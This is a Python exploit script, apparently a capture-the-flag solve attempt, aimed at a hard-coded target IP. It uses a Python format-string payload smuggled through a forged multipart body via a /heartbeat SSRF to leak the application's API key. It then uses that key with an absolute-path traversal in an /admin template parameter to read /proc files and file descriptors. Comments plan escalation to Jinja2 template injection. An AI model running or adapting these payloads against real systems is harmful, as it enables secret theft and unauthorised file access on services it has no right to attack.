import httpx
import re
import time

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=30.0)
    return r.text.strip()

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
    return r.text, r.status_code

if __name__ == "__main__":
    print("[*] Getting API Key...")
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # The admin route does path traversal check using os.path.join
    # os.path.join('./templates', '/etc/passwd') = '/etc/passwd' (absolute path wins)
    # Then it does os.path.exists(tmpl_path) and open(tmpl_path, 'r').read()
    # Finally render_template_string(tmpl_content)
    
    # The key is that render_template_string will execute Jinja2 templates!
    # So if we can read a file that contains Jinja2 syntax like {{...}}
    # we can get SSTI
    
    # Looking for files that might contain {{ }}
    # /proc/self/environ might have our injected content
    
    # Actually, looking back at the code - when we use format string attack
    # We're in the /action endpoint (via /heartbeat SSRF)
    # The content.format(app) happens there
    
    # For admin SSTI, we need a file with {{ }} content
    # Let me check if there's a way to inject via some proc files
    
    # Let's try /proc/self/stat - contains process info
    print("\n[*] Reading /proc/self/stat...")
    content, code = read_file_via_admin(api_key, "/proc/self/stat")
    print(f"Status: {code}")
    print(content[:300] if content else "Empty")
    
    # Try /proc/self/comm
    print("\n[*] Reading /proc/self/comm...")
    content, code = read_file_via_admin(api_key, "/proc/self/comm")
    print(f"Status: {code}")
    print(content[:100] if content else "Empty")
    
    # Let's try directory listing trick via /proc/self/task
    print("\n[*] Reading /proc/self/task/20/fd...")
    for i in range(10):
        content, code = read_file_via_admin(api_key, f"/proc/self/task/20/fd/{i}")
        if code == 200 and content:
            print(f"fd/{i}: {content[:50]}...")
    
    # Try /proc/net/tcp to get network connections
    print("\n[*] Reading /proc/net/tcp...")
    content, code = read_file_via_admin(api_key, "/proc/net/tcp")
    print(content[:500] if code == 200 else f"Failed: {code}")
    
    # In a container, /proc/1/root usually points to container's root
    # Let me try symlink resolution
    print("\n[*] Trying /proc/1/fd/")
    for i in range(10):
        try:
            content, code = read_file_via_admin(api_key, f"/proc/1/fd/{i}")
            if code == 200 and content:
                print(f"/proc/1/fd/{i}: {content[:80]}...")
        except:
            pass
